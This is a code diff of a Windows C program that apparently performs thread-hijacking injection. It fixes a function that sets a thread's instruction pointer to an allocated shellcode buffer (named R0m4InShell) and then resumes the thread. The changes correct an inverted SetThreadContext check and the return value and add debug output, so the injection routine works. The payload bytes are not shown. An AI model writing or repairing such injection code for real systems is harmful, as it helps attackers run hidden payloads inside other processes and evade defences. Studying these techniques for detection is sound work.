@@ -73,15 +73,17 @@ BOOL ThreadHijacking(IN HANDLE hThread,IN PBYTE pPayload,IN SIZE_T szPayload) {
         warning("get thread context failed");
         return FALSE;
     }
+    printf("We got context\n");
 
     ctx.Rip = (DWORD64)pAddress;  // Assign the address of the allocated payload
 
-    if (SetThreadContext(hThread, &ctx)) {
-        warning("SetThreadContext Failed With Error : %d \nw",GetLastError());
+    if (!SetThreadContext(hThread, &ctx)) {
+        warning("SetThreadContext Failed With Error : %d \n",GetLastError());
         return FALSE;
     }
 
-    return EXIT_SUCCESS;
+    printf("We set context\n");
+    return TRUE;
 }
 
 
@@ -106,10 +108,13 @@ int main(int argc, char* argv) {
     okay("Thread hijacked 0x%lx", dwThreadId);
 
     if (!ThreadHijacking(hThread, R0m4InShell,sizeof(R0m4InShell))) {
+        printf("We didn't hijack it !\n");
         return -1;
     }
+    okay("Thread is hijacked");
     ResumeThread(hThread);
     printf("[#] Press <Enter> To Quit ... ");
+    Sleep(1000);
     getchar();
     return 0;
 
